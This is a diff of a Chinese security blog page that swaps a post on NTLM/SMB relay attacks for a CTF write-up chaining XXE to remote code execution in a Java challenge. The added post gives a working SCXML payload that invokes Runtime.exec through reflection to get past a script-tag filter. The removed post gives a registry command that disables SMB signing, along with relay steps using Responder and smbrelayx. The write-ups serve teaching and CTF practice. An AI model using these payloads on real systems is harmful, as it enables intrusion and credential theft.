@@ -4,13 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="NTLM_smb 中继攻击, wa1ki0g,blog,github">
-    <meta name="description" content="NTLM中继其实简单来说，ntlm中继攻击就是一种中间人攻击
-Windows系统域名解析顺序
-
-本地hosts文件（%Systemroot%\System32\drivers\etc\hosts）
-DNS缓存/DNS服务器
-链路本地多播名称">
+    <meta name="keywords" content="从xxe到rce-记一道ctf中的java题, wa1ki0g,blog,github">
+    <meta name="description" content="前言今天下午朋友在打比赛好像是什么数据安全的，闲着没事就要了道java题的源码，感觉挺有意思的。好像比赛结束了，就把wp写出来了
+思路给了个jar包，反编译看代码：
+先看object那个路由，就是拼接下我们传进去的文件名，然后读取文件，获取">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -22,7 +19,7 @@ DNS缓存/DNS服务器
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>NTLM_smb 中继攻击 | wa1ki0g‘s blog</title>
+    <title>从xxe到rce-记一道ctf中的java题 | wa1ki0g‘s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -263,12 +260,12 @@ DNS缓存/DNS服务器
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">NTLM_smb 中继攻击</h1>
+                    <h1 class="description center-align post-title">从xxe到rce-记一道ctf中的java题</h1>
                 </div>
             </div>
         </div>
@@ -384,8 +381,8 @@ DNS缓存/DNS服务器
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">
-                                <span class="chip bg-color">内网安全</span>
+                            <a href="/tags/Java%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">Java安全</span>
                             </a>
                         
                     </div>
@@ -396,8 +393,8 @@ DNS缓存/DNS服务器
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="post-category">
-                                内网安全
+                            <a href="/categories/Java%E5%AE%89%E5%85%A8/" class="post-category">
+                                Java安全
                             </a>
                         
                     </div>
@@ -409,21 +406,21 @@ DNS缓存/DNS服务器
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-11-27
+                    2023-04-01
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-03-21
+                    2023-04-02
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    719
+                    603
                 </div>
                 
 
@@ -445,39 +442,44 @@ DNS缓存/DNS服务器
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="NTLM中继"><a href="#NTLM中继" class="headerlink" title="NTLM中继"></a>NTLM中继</h2><p>其实简单来说，ntlm中继攻击就是一种中间人攻击</p>
-<p><strong>Windows系统域名解析顺序</strong></p>
-<ol>
-<li>本地hosts文件（%Systemroot%\System32\drivers\etc\hosts）</li>
-<li>DNS缓存/DNS服务器</li>
-<li>链路本地多播名称解析（LLMNR）和NetBIOS名称服务（NBNS）</li>
-</ol>
-<p>当1，2步请求失败时，Windows系统就会通过LLMNR和NetBIOS名称服务在本地进行名称解析。这时，客户端就会将未经认证的UDP广播到网络中，询问它是否为本地系统的名称。这时我们监听网段的请求，就可以对信息进行捕捉，我们可以监听到的大多都是Net-NTLM hash，他并不是我们明文的直接hash值，所以我们不可以利用它直接进行横向攻击。</p>
-<h2 id="smb中继"><a href="#smb中继" class="headerlink" title="smb中继"></a>smb中继</h2><p><strong>smb中继攻击是基于ntml中继攻击的一种，因为SMB的认证是可以基于NTLM协议或者kerberos协议</strong></p>
-<p><strong>对于SMB协议，客户端在连接服务端时，默认先使用本机的用户名和密码hash尝试登录，所以可以模拟SMB服务器从而截获Net-NTLM hash，进行破解明文，或进行中继</strong></p>
-<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>环境：<br>kali：10.10.10.160<br>域控：10.10.10.10<br>pc1：10.10.10.201<br>pc2：10.10.10.80</p>
-<p><strong>利用LLMNR和NetBIOS截取Net-NTLM Hash</strong></p>
-<p>使用responder监听同域内中所有主机的广播请求：<br><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/NTLM_smb%20%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB/1.png"><br>pc1上输入个错误的地址，让其通过LLMNR和NetBIOS进行名称解析：</p>
-<p><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/NTLM_smb%20%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB/2.png"><br>得到hash：</p>
-<p><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/NTLM_smb%20%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB/3.png"><br><strong>利用smb 中继进行攻击</strong></p>
-<blockquote>
-<p>再说smb攻击之前，先介绍一下SMB签名<br>SMB签名是一种服务器与客户端协商以使用继承的会话密钥对所有传入的数据包进行数字签名的配置。这样的话，即使NTLM会话还是可能被Relay，服务器也不会被利用，因为攻击者缺少会话密钥。在Active<br>Directory 网络中只有域名控制器默认开启SMB签名，其他的所有服务器或工作组默认不受保护。所以只有被攻击的目标机器SMB签名关闭的时候，才会攻击成功</p>
-</blockquote>
-<p>探测一波，可以看到与前面说的比较符合，只有域控默认会开启smb签名：</p>
-<p><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/NTLM_smb%20%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB/4.png"><br>可以关掉：</p>
-<pre class=" language-javascript"><code class="language-javascript">reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters <span class="token operator">/</span>v RequireSecuritySignature <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d <span class="token number">0</span> <span class="token operator">/</span>f
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>今天下午朋友在打比赛好像是什么数据安全的，闲着没事就要了道java题的源码，感觉挺有意思的。好像比赛结束了，就把wp写出来了</strong></p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><strong>给了个jar包，反编译看代码：</strong><br><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/%E4%BB%8Exxe%E5%88%B0rce-%E8%AE%B0%E4%B8%80%E9%81%93ctf%E4%B8%AD%E7%9A%84java%E9%A2%98/1.png"></p>
+<p><strong>先看object那个路由，就是拼接下我们传进去的文件名，然后读取文件，获取文件的内容，然后进行xml解析。这里用的是 SCXMLReader , 它这里有个rce，poc如下：</strong></p>
+<p><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/%E4%BB%8Exxe%E5%88%B0rce-%E8%AE%B0%E4%B8%80%E9%81%93ctf%E4%B8%AD%E7%9A%84java%E9%A2%98/2.png"><br><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/%E4%BB%8Exxe%E5%88%B0rce-%E8%AE%B0%E4%B8%80%E9%81%93ctf%E4%B8%AD%E7%9A%84java%E9%A2%98/3.png"></p>
+<p><strong>可以看到上面的poc是用的 &lt;script&gt;&lt;/script&gt;，但是在check方法中被ban掉了：</strong></p>
+<p><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/%E4%BB%8Exxe%E5%88%B0rce-%E8%AE%B0%E4%B8%80%E9%81%93ctf%E4%B8%AD%E7%9A%84java%E9%A2%98/4.png"></p>
+<p><strong>去看文档，其实可以发现挺多的替代标签：</strong></p>
+<p><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/%E4%BB%8Exxe%E5%88%B0rce-%E8%AE%B0%E4%B8%80%E9%81%93ctf%E4%B8%AD%E7%9A%84java%E9%A2%98/5.png"><br><strong>构造一个没有srcipt标签的poc：</strong></p>
+<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scxml</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2005/07/scxml<span class="token punctuation">"</span></span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1.0<span class="token punctuation">"</span></span> <span class="token attr-name">initial</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>wa1ki0g<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>state</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>wa1ki0g<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>onentry</span><span class="token punctuation">></span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>assign</span> <span class="token attr-name">location</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rce<span class="token punctuation">"</span></span> <span class="token attr-name">expr</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span><span class="token punctuation">'</span>.getClass().forName(<span class="token punctuation">'</span>java.lang.Runtime<span class="token punctuation">'</span>).getMethod(<span class="token punctuation">'</span>exec<span class="token punctuation">'</span>,<span class="token punctuation">'</span><span class="token punctuation">'</span>.getClass()).invoke(<span class="token punctuation">'</span><span class="token punctuation">'</span>.getClass().forName(<span class="token punctuation">'</span>java.lang.Runtime<span class="token punctuation">'</span>).getMethod(<span class="token punctuation">'</span>getRuntime<span class="token punctuation">'</span>).invoke(null),<span class="token punctuation">'</span>open -a calculator<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>onentry</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>state</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scxml</span><span class="token punctuation">></span></span>
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/NTLM_smb%20%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB/5.png"></p>
-<p><strong>利用responder+MultiRelay.py获取shell：</strong></p>
-<p>修改下Responder.conf ：</p>
-<p><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/NTLM_smb%20%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB/6.png"><br>开启responder与MultiRelay.py，填好要攻击的目标pc2的ip：</p>
-<p><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/NTLM_smb%20%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB/7.png"><br>其他机器上随便传一个smb流量：</p>
-<p><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/NTLM_smb%20%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB/8.png"></p>
-<p>攻击成功：</p>
-<p><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/NTLM_smb%20%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB/9.png"><br> <strong>利用 smbrelayx.py 获取shell：</strong></p>
-<p>原理： 伪造一个我们恶意的SMB服务器，当内网中有机器访问这个我们精心构造好的SMB服务器时， smbrelayx.py 将抓到Client1 的 hash ，然后 smbrelayx.py 用抓取到的 Client1 的 hash 重 放给 Client2 </p>
-<p><strong>指定要攻击的机器ip：</strong><br><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/NTLM_smb%20%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB/10.png"></p>
-<p><strong>在其他机器上传一个smb的流量：</strong><br><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/NTLM_smb%20%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB/11.png"><br><strong>命令执行成功：</strong><br><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/NTLM_smb%20%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB/12.png"></p>
+<p><strong>本地打一下，可以rce的是：</strong></p>
+<p><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/%E4%BB%8Exxe%E5%88%B0rce-%E8%AE%B0%E4%B8%80%E9%81%93ctf%E4%B8%AD%E7%9A%84java%E9%A2%98/6.png"></p>
+<p><strong>现在poc有了，该如何将我们的poc写到目标环境里，因为代码里的file协议只能读自己本地的文件。</strong></p>
+<p><strong>我们看xxe那个路由，传进去一个url，他会读取url页面的内容，然后当作xml进行解析，也没有过滤，妥妥的xml注入。但是这里读不到根目录的flag，并且根目录有个 /readflag 文件，估计作者的本意就是让rce吧。</strong></p>
+<p><strong>java的xxe，可以利用jar协议写缓存文件到目标环境上，但是文件很快就会删除。这里可以用下别的师傅写的延长临时文件存在的一个脚本：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/pwntester/BlockingServer">https://github.com/pwntester/BlockingServer</a></p>
+<p><strong>我们传到目标环境后，由于目标的缓存文件命名是无规范的，所以这里要用 xxe+ftp 去列目录，这个我要是没记错的话在小与等于java8的某个小版本下是可行的，在后续的版本是利用不了了，这有点忘了，感兴趣的师傅可以下去查下。</strong></p>
+<p><strong>1. 开个http:</strong></p>
+<p><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/%E4%BB%8Exxe%E5%88%B0rce-%E8%AE%B0%E4%B8%80%E9%81%93ctf%E4%B8%AD%E7%9A%84java%E9%A2%98/7.png"></p>
+<p><strong>/tmp目录下的upload.txt文件：</strong></p>
+<p><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/%E4%BB%8Exxe%E5%88%B0rce-%E8%AE%B0%E4%B8%80%E9%81%93ctf%E4%B8%AD%E7%9A%84java%E9%A2%98/8.png"></p>
+<p><strong>2.构造一个poc.zip，然后利用BlockingServer进行上传：</strong></p>
+<p><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/%E4%BB%8Exxe%E5%88%B0rce-%E8%AE%B0%E4%B8%80%E9%81%93ctf%E4%B8%AD%E7%9A%84java%E9%A2%98/9.png"></p>
+<p><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/%E4%BB%8Exxe%E5%88%B0rce-%E8%AE%B0%E4%B8%80%E9%81%93ctf%E4%B8%AD%E7%9A%84java%E9%A2%98/10.png"></p>
+<p><strong>3.利用xxe+ftp 列目录找文件，这里可以利用xxer.py：</strong></p>
+<p><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/%E4%BB%8Exxe%E5%88%B0rce-%E8%AE%B0%E4%B8%80%E9%81%93ctf%E4%B8%AD%E7%9A%84java%E9%A2%98/11.png"><br><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/%E4%BB%8Exxe%E5%88%B0rce-%E8%AE%B0%E4%B8%80%E9%81%93ctf%E4%B8%AD%E7%9A%84java%E9%A2%98/12.png"></p>
+<p><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/%E4%BB%8Exxe%E5%88%B0rce-%E8%AE%B0%E4%B8%80%E9%81%93ctf%E4%B8%AD%E7%9A%84java%E9%A2%98/13.png"><br><strong>4.成功找到文件</strong></p>
+<p><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/%E4%BB%8Exxe%E5%88%B0rce-%E8%AE%B0%E4%B8%80%E9%81%93ctf%E4%B8%AD%E7%9A%84java%E9%A2%98/14.png"></p>
+<p><strong>5.我们可以本地读一下这个缓存文件：</strong></p>
+<p><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/%E4%BB%8Exxe%E5%88%B0rce-%E8%AE%B0%E4%B8%80%E9%81%93ctf%E4%B8%AD%E7%9A%84java%E9%A2%98/15.png"><br><strong>6. 最后利用objetc路由成功执行了我们的poc：</strong></p>
+<p><img src="https://raw.githubusercontent.com/wa1ki0g/blogPicture/main/%E4%BB%8Exxe%E5%88%B0rce-%E8%AE%B0%E4%B8%80%E9%81%93ctf%E4%B8%AD%E7%9A%84java%E9%A2%98/16.png"></p>
 
                 
             </div>
@@ -504,7 +506,7 @@ DNS缓存/DNS服务器
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/11/27/NTLM-smb-%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB/">http://example.com/2021/11/27/NTLM-smb-%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB/</a>
+                    <a href="http://example.com/2023/04/01/%E4%BB%8Exxe%E5%88%B0rce-%E8%AE%B0%E4%B8%80%E9%81%93ctf%E4%B8%AD%E7%9A%84java%E9%A2%98/">http://example.com/2023/04/01/%E4%BB%8Exxe%E5%88%B0rce-%E8%AE%B0%E4%B8%80%E9%81%93ctf%E4%B8%AD%E7%9A%84java%E9%A2%98/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -542,8 +544,8 @@ DNS缓存/DNS服务器
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">
-                                    <span class="chip bg-color">内网安全</span>
+                                <a href="/tags/Java%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">Java安全</span>
                                 </a>
                             
                         </div>
@@ -715,17 +717,18 @@ DNS缓存/DNS服务器
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/12/27/NTLM%E4%B8%8Ekerberos%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB%E8%AF%A6%E8%A7%A3/">
+                <a href="/2023/04/01/%E4%BB%8Exxe%E5%88%B0rce-%E8%AE%B0%E4%B8%80%E9%81%93ctf%E4%B8%AD%E7%9A%84java%E9%A2%98/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="NTLM与kerberos认证体系详解">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="从xxe到rce-记一道ctf中的java题">
                         
-                        <span class="card-title">NTLM与kerberos认证体系详解</span>
+                        <span class="card-title">从xxe到rce-记一道ctf中的java题</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -735,26 +738,27 @@ DNS缓存/DNS服务器
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-12-27
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-01
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="post-category">
-                                    内网安全
+                            <a href="/categories/Java%E5%AE%89%E5%85%A8/" class="post-category">
+                                    Java安全
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">内网安全</span>
+                    <a href="/tags/Java%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">Java安全</span>
                     </a>
                     
                 </div>
@@ -768,13 +772,13 @@ DNS缓存/DNS服务器
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2018/09/30/redis%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93/">
+                <a href="/2022/09/25/%E4%B8%80%E4%BA%9B%E7%9C%9F%E5%AE%9E%E7%9A%84app%E6%B8%97%E9%80%8F%E4%B8%8E%E7%AE%97%E6%B3%95hook/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="redis攻击总结">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="一些真实的app渗透与算法hook">
                         
-                        <span class="card-title">redis攻击总结</span>
+                        <span class="card-title">一些真实的app渗透与算法hook</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -785,14 +789,14 @@ DNS缓存/DNS服务器
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2018-09-30
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-25
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/" class="post-category">
-                                    数据库安全
+                            <a href="/categories/app%E5%AE%89%E5%85%A8/" class="post-category">
+                                    app安全
                                 </a>
                             
                             
@@ -802,8 +806,8 @@ DNS缓存/DNS服务器
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">数据库安全</span>
+                    <a href="/tags/app%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">app安全</span>
                     </a>
                     
                 </div>
